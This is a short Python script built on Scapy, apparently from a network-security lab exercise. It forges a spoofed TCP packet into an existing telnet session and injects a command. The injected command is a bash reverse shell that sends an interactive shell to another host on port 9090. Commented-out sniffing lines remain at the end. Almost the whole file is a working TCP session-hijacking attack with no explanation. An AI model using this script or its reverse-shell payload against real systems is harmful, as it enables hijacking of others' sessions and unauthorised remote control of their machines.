from socket import IP_ADD_MEMBERSHIP
from scapy.all import*

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

ip  = IP(src=IP_B,dst=IP_A)
tcp = TCP(sport=47856, dport=23, flags="A", seq=54295374, ack=1842025367)
data="\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)

    
#iface=['br-fd2d696261de', 'enp0s3']
#filter1 = 'tcp and port 23'
#pkt = sniff(iface = ['br-fd2d696261de'], filter=filter1, prn=print_pkt)

